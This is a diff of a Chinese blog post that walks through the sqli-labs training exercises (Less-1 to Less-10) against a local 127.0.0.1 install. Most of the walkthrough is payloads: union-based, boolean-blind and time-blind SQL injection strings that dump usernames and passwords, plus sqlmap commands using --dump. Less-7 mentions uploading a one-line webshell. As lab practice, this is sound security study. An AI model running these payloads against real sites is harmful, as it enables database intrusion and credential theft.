@@ -1,32 +1,1218 @@
-<!DOCTYPE HTML><html lang="zh-CN"><head><meta charset="utf-8"><meta name="keywords" content="sqli-labs, Amy"><meta name="description" content=""><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><meta name="renderer" content="webkit|ie-stand|ie-comp"><meta name="mobile-web-app-capable" content="yes"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><title>sqli-labs | Amy</title><link rel="icon" type="image/svg+xml" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/favicon.svg"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/awesome/css/all.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/materialize/materialize.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/aos/aos.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/animate/animate.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/lightGallery/css/lightgallery.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/css/matery.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/css/my.min.css"><script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/jquery/jquery.min.js"></script><meta name="generator" content="Hexo 5.3.0"><style>.github-emoji{position:relative;display:inline-block;width:1.2em;min-height:1.2em;overflow:hidden;vertical-align:top;color:transparent}.github-emoji>span{position:relative;z-index:10}.github-emoji .fancybox,.github-emoji img{margin:0!important;padding:0!important;border:none!important;outline:0!important;text-decoration:none!important;user-select:none!important;cursor:auto!important}.github-emoji img{height:1.2em!important;width:1.2em!important;position:absolute!important;left:50%!important;top:50%!important;transform:translate(-50%,-50%)!important;user-select:none!important;cursor:auto!important}.github-emoji-fallback{color:inherit}.github-emoji-fallback img{opacity:0!important}</style></head><body><header class="navbar-fixed"><nav id="headNav" class="bg-color nav-transparent"><div id="navContainer" class="nav-wrapper container"><div class="brand-logo"><a href="/" class="waves-effect waves-light"><img src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/medias/logo.svg" class="logo-img" alt="LOGO"> <span class="logo-span">Amy</span></a></div><a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a><ul class="right nav-menu"><li class="hide-on-med-and-down nav-item"><a href="/" class="waves-effect waves-light"><i class="fas fa-home" style="zoom:.6"></i> <span>首页</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/tags" class="waves-effect waves-light"><i class="fas fa-tags" style="zoom:.6"></i> <span>标签</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fas fa-bookmark" style="zoom:.6"></i> <span>分类</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fas fa-archive" style="zoom:.6"></i> <span>归档</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/about" class="waves-effect waves-light"><i class="fas fa-user-circle" style="zoom:.6"></i> <span>关于</span></a></li><li><a href="#searchModal" class="modal-trigger waves-effect waves-light"><i id="searchIcon" class="fas fa-search" title="搜索" style="zoom:.85"></i></a></li></ul><div id="mobile-nav" class="side-nav sidenav"><div class="mobile-head bg-color"><img src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/medias/logo.svg" class="logo-img circle responsive-img"><div class="logo-name">Amy</div><div class="logo-desc">Never really desperate, only the lost of the soul.</div></div><ul class="menu-list mobile-menu-list"><li class="m-nav-item"><a href="/" class="waves-effect waves-light"><i class="fa-fw fas fa-home"></i> 首页</a></li><li class="m-nav-item"><a href="/tags" class="waves-effect waves-light"><i class="fa-fw fas fa-tags"></i> 标签</a></li><li class="m-nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fa-fw fas fa-bookmark"></i> 分类</a></li><li class="m-nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fa-fw fas fa-archive"></i> 归档</a></li><li class="m-nav-item"><a href="/about" class="waves-effect waves-light"><i class="fa-fw fas fa-user-circle"></i> 关于</a></li></ul></div></div></nav></header><div class="bg-cover pd-header post-cover" style="background-image:url(https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png)"><div class="container" style="right:0;left:0"><div class="row"><div class="col s12 m12 l12"><div class="brand"><h1 class="description center-align post-title">sqli-labs</h1></div></div></div></div></div><main class="post-container content"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/tocbot/tocbot.min.css"><style>#articleContent h1::before,#articleContent h2::before,#articleContent h3::before,#articleContent h4::before,#articleContent h5::before,#articleContent h6::before{display:block;content:" ";height:100px;margin-top:-100px;visibility:hidden}#articleContent :focus{outline:0}.toc-fixed{position:fixed;top:64px}.toc-widget{width:345px;padding-left:20px}.toc-widget .toc-title{padding:35px 0 15px 17px;font-size:1.5rem;font-weight:700;line-height:1.5rem}.toc-widget ol{padding:0;list-style:none}#toc-content{padding-bottom:30px;overflow:auto}#toc-content ol{padding-left:10px}#toc-content ol li{padding-left:10px}#toc-content .toc-link:hover{color:#66a6ff;font-weight:700;text-decoration:underline}#toc-content .toc-link::before{background-color:transparent;max-height:25px;position:absolute;right:23.5vw;display:block}#toc-content .is-active-link{color:#66a6ff}#floating-toc-btn{position:fixed;right:15px;bottom:76px;padding-top:15px;margin-bottom:0;z-index:998}#floating-toc-btn .btn-floating{width:48px;height:48px}#floating-toc-btn .btn-floating i{line-height:48px;font-size:1.4rem}</style><div class="row"><div id="main-content" class="col s12 m12 l9"><div id="artDetail"><div class="card"><div class="card-content article-info"><div class="row tag-cate"><div class="col s7"><div class="article-tag"><a href="/tags/web/"><span class="chip bg-color">web</span></a></div></div><div class="col s5 right-align"><div class="post-cate"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></div></div></div><div class="post-info"><div class="post-date info-break-policy"><i class="far fa-calendar-minus fa-fw"></i>发布日期: 2020-11-28</div><div class="post-date info-break-policy"><i class="far fa-calendar-check fa-fw"></i>更新日期: 2021-02-22</div><div class="info-break-policy"><i class="far fa-file-word fa-fw"></i>文章字数: 2.6k</div><div class="info-break-policy"><i class="far fa-clock fa-fw"></i>阅读时长: 12 分</div></div></div><hr class="clearfix"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/prism/prism.min.css"><div class="card-content article-card-content"><div id="articleContent"><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>手动</strong></p><p>先判断注入类型。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 --+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sqli-labs, Amy">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sqli-labs | Amy</title>
+    <link rel="icon" type="image/svg+xml" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/favicon.svg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/aos/aos.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/css/my.min.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/medias/logo.svg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Amy</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/medias/logo.svg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Amy</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sqli-labs</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/tocbot/tocbot.min.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #66a6ff;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #66a6ff;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:
+                    2020-11-28
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:
+                    2021-02-22
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:
+                    2.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:
+                    12 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>手动</strong></p>
+<p>先判断注入类型。</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=1 --+
+http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 --+
 http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 2 --+
 http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194701808.png" alt="image-20210208194701808"></p><p>显示位是2,3。所以可以在 2,3位置进行sql注入</p><p>这里涉及到几个函数</p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p><pre class="line-numbers language-none"><code class="language-none">爆库:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,database() --+
+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194701808.png" alt="image-20210208194701808"></p>
+<p>显示位是2,3。所以可以在 2,3位置进行sql注入</p>
+<p>这里涉及到几个函数</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p>
+<pre class="line-numbers language-none"><code class="language-none">爆库:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,database() --+
 爆表:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
 爆字段:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
-爆值:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194722570.png" alt="image-20210208194722570"></p><p><strong>sqlmap</strong></p><p>为了方便截图,后面加个输出参数为0</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql –batch –v 0
+爆值:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194722570.png" alt="image-20210208194722570"></p>
+<p><strong>sqlmap</strong></p>
+<p>为了方便截图,后面加个输出参数为0</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql –batch –v 0
 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql --dbs --batch -v 0 #查有哪些模式
 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security --tables  --batch -v 0 #查表
 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users --columns  --batch -v 0 #查字段
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194906554.png" alt="image-20210208194906554"></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p><strong>手动</strong></p><p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和less1一样</p><p><strong>sqlmap</strong></p><p>套less1的语句就行</p><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p><strong>手动</strong></p><p>先传id=1 好家伙</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194806106.png" alt="image-20210208194806106"></p><p>要构造闭合,上一篇slq注入的文章写过</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来的和上面一样操作</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1') --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个还是可以</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194824485.png" alt="image-20210208194824485"></p><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195001271.png" alt="image-20210208195001271"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-4/?id=1"
-和上面的类似,只需要闭合"")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和上面的操作一样</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-4/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195017876.png" alt="image-20210208195017876"></p><p><strong>手动</strong></p><p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5/?id=1' and left((select database()),2)="se" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200311822.png" alt="image-20210208200311822"></p><p>后面的就和前面差不多了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195053128.png" alt="image-20210208195053128"></p><pre class="line-numbers language-none"><code class="language-none">查看security数据库的表
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195747622.png" alt="image-20210208195747622"></p><pre class="line-numbers language-none"><code class="language-none">查看字段
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195649270.png" alt="image-20210208195649270"></p><pre class="line-numbers language-none"><code class="language-none">查看用户名和密码
- python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195813166.png" alt="image-20210208195813166"></p><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p><p>先确定是如何闭合的，如下</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-7?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195934527.png" alt="image-20210208195934527"></p><p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p><p><strong>sqlmap</strong></p><p>布尔盲注直接跑</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>手动</strong></p><p>这题也是布尔盲注，payload和第五题差不多，可以用left函数或ASCII函数来一个一个来判断，还是用sqlmap舒服🤣</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-8/?id=1' --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>时间注入</p><p><strong>手动</strong></p><p>又是一个一个去试，可以采用ASCII函数采用二分法来找到正确的字符，然后配合sleep(5)函数来构造</p><p><strong>sqlmap</strong></p><p>把technique改成T来试试</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-9/?id=1' --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>手动</strong></p><p>还是时间注入,只是和上一题的拼接方式不一样</p><p>先构造闭合，试了一下下面几个，马上就显示you are in了，说明没有被执行</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1' and sleep(5)--+
+sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结果:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194906554.png" alt="image-20210208194906554"></p>
+<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>手动</strong></p>
